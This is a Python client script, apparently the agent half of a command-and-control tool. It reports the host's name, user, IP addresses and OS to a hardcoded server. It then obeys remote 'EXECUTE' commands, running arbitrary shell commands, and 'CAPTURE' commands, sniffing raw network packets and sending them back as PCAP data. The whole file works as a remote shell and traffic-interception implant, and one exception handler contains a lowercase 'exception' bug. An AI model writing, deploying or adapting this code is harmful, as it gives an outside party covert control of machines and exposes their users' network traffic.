import socket
import os
import subprocess
import platform
import re
import time
import struct
import json

# Global variables for server configuration
SERVER_IPS = ["192.168.0.1"]
SERVER_PORT = 5000

def get_ip_addresses():
    """Collect all IPv4 addresses from network interfaces."""
    system = platform.system()
    if system == 'Linux':
        try:
            output = subprocess.check_output(["ip", "addr", "show"], text=True)
            ip_addresses = []
            for line in output.splitlines():
                if "inet " in line and "inet6" not in line:  # IPv4 only
                    parts = line.split()
                    ip = parts[1].split("/")[0]
                    ip_addresses.append(ip)
            return ip_addresses
        except Exception as e:
            print(f"Error getting IP addresses on Linux: {e}")
            return []
    elif system == 'Windows':
        try:
            output = subprocess.check_output(["ipconfig"], text=True)
            ip_addresses = []
            for line in output.splitlines():
                if "IPv4 Address" in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        ip = parts[1].strip()
                        if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip):
                            ip_addresses.append(ip)
            return ip_addresses
        except Exception as e:
            print(f"Error getting IP addresses on Windows: {e}")
            return []
    else:
        try:
            output = subprocess.check_output(["ip", "addr", "show"], text=True)
            ip_addresses = []
            for line in output.splitlines():
                if "inet " in line and "inet6" not in line:  # IPv4 only
                    parts = line.split()
                    ip = parts[1].split("/")[0]
                    ip_addresses.append(ip)
            return ip_addresses
        except Exception as e:
            print(f"Error getting IP addresses on unknown OS: {e}")
            return []

def capture_packets(duration):
    """Capture packets for a specified duration and return a PCAP file."""
    try:
        # Requires root privileges on Linux
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
        start_time = time.time()
        packets = []
        while time.time() - start_time < int(duration):
            packet, _ = sock.recvfrom(65535)
            timestamp = time.time()
            packets.append((timestamp, packet))
        # Construct PCAP file
        # Global header: magic_number, version_major, version_minor, thiszone, sigfigs, snaplen, network
        pcap_global_header = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
        pcap_data = pcap_global_header
        for ts, packet in packets:
            sec = int(ts)
            usec = int((ts - sec) * 1000000)
            len_cap = len(packet)
            # Packet header: ts_sec, ts_usec, incl_len, orig_len
            pcap_packet_header = struct.pack("<IIII", sec, usec, len_cap, len_cap)
            pcap_data += pcap_packet_header + packet
        sock.close()
        return pcap_data
    except PermissionError:
        print("Packet capture requires root privileges.")
        return b""
    except Exception as e:
        print(f"Error capturing packets: {e}")
        return b""

def main():
    """Client main function."""
    # Collect client information
    hostname = socket.gethostname()
    try:
        username = os.getlogin()
    except:
        username = os.environ.get("USER", "unknown")
        
    try:
        try:
            operating_system = os.uname()
        except:
            operating_system = platform.system()
    except exception as e:
        operating_system = f"Unable to retrieve OS Info: {e}"
        
    
    ip_addresses = get_ip_addresses()
    info = {
        "hostname": hostname,
        "username": username,
        "ip_addresses": ip_addresses,
        "operating_system": operating_system
    }

    # Connect to server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    for server_ip in SERVER_IPS:
        try:
            client_socket.connect((server_ip, SERVER_PORT))
            print(f"Connected to server at {server_ip}:{SERVER_PORT}")
            break
        except Exception as e:
            print(f"Failed to connect to {server_ip}: {e}")
            continue
    else:
        print("Could not connect to any server.")
        return

    # Send initial information
    client_socket.send(json.dumps(info).encode())
    print(json.dumps(info).encode())
    # Listen for commands
    while True:
        try:
            command = client_socket.recv(1024).decode().strip()
            if not command:
                break
            if command.startswith("CAPTURE"):
                duration = command.split()[1]
                pcap_data = capture_packets(duration)
                if pcap_data:
                    client_socket.send(f"PCAP {len(pcap_data)}\n".encode())
                    client_socket.sendall(pcap_data)
            elif command.startswith("EXECUTE"):
                cmd = command.split(maxsplit=1)[1]
                try:
                    result = subprocess.run(
                        cmd, shell=True, capture_output=True, text=True, timeout=30
                    )
                    output = f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
                except Exception as e:
                    output = f"Error executing command: {e}"
                client_socket.send(f"OUTPUT {len(output)}\n".encode())
                client_socket.sendall(output.encode())
        except Exception as e:
            print(f"Error: {e}")
            break
    client_socket.close()

if __name__ == "__main__":
    main()